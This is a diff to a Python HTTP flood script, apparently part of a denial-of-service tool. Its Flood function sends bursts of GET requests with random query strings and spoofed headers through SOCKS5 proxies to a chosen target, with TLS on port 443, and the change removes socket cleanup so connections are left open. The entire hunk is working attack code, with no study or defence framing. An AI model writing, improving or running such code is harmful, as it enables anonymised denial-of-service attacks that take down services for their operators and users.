@@ -99,23 +99,19 @@ def Flood(indexPicker):
         try:
             socks.setdefaultproxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             s = socks.socksocket()
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((targetHost, targetPort))
             if targetPort == 443:
                 sslContext = ssl.SSLContext()
                 s = sslContext.wrap_socket(s, server_hostname=targetHost)
-            try:
-                for _ in range(100):
-                    valueParams = f"?{rC(queryParams)}={rI(1, 65535)}&{rC(queryParams)}={rI(1, 65535)}"
-                    floodHeader = f"GET {targetPath}{valueParams} HTTP/1.1\r\nHost: {targetHost}\r\n" + Connection + Accept + Referer + X_Forwarded_For + User_Agent
-                    s.send(str(floodHeader).encode())
-                    s.send(str(floodHeader).encode())
-                s.close()
-                print("Flood sent " + proxy[0] + ":" + proxy[1])
-            except:
-                s.close()
+            for _ in range(100):
+                valueParams = f"?{rC(queryParams)}={rI(1, 65535)}&{rC(queryParams)}={rI(1, 65535)}"
+                floodHeader = f"GET {targetPath}{valueParams} HTTP/1.1\r\nHost: {targetHost}\r\n" + Connection + Accept + Referer + X_Forwarded_For + User_Agent
+                s.send(str(floodHeader).encode())
+                s.send(str(floodHeader).encode())
+            
+            print("Flood sent " + proxy[0] + ":" + proxy[1])
         except:
-            s.close()
+            time.sleep(.1)
 
 if "--socksCrawler" in sys.argv:
     socksCrawler()
